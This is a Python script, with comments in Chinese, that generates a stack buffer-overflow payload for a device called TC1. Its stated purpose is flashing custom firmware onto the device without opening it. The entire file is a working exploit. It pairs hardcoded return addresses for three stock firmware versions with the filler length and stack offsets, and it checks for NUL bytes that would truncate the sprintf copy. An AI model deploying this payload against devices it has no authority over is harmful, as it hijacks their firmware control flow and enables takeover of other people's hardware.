#!/usr/bin/env python3
"""生成 TC1 免拆刷机 payload（按原厂版本选择返回地址）。

支持的原厂版本与目标地址：
  1.0.0.26 -> 0x1F073D9F
  1.0.0.24 -> 0x1F073D63
  1.0.0.21 -> 0x1F073D2F

载荷格式：392 个字节的 'A' + 目标地址小端 4 字节 + 1 字节 NUL，共 397 字节。
帧内偏移三个版本一致（BUF_OFF=0x148、LR_OFF=0x2d4、filler=392），
只有目标地址不同。目标地址的 4 字节小端不能含 0x00，否则会被 sprintf 的 %s 截断。

用法：
  python3 gen-trigger.py --version 1.0.0.21 --out tftp-trigger.bin
"""

import argparse
import struct

TARGETS = {
    "1.0.0.26": 0x1F073D9F,
    "1.0.0.24": 0x1F073D63,
    "1.0.0.21": 0x1F073D2F,
}
FILLER = 392
NUL = bytes(1)


def build(version):
    target = TARGETS[version]
    raw = struct.pack("<I", target)
    if NUL in raw:
        raise SystemExit(
            "目标地址 " + hex(target) + " 的小端表示含 0x00，无法用于 sprintf 写入"
        )
    return b"A" * FILLER + raw + NUL


def main(argv=None):
    parser = argparse.ArgumentParser(description="生成 TC1 免拆刷机 payload")
    parser.add_argument("--version", choices=sorted(TARGETS), required=True,
                        help="原厂业务版本")
    parser.add_argument("--out", default="tftp-trigger.bin", help="输出文件")
    args = parser.parse_args(argv)
    body = build(args.version)
    with open(args.out, "wb") as stream:
        stream.write(body)
    print(args.out + ": " + str(len(body)) + " B, 版本 " + args.version +
          ", 目标 " + hex(TARGETS[args.version]))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
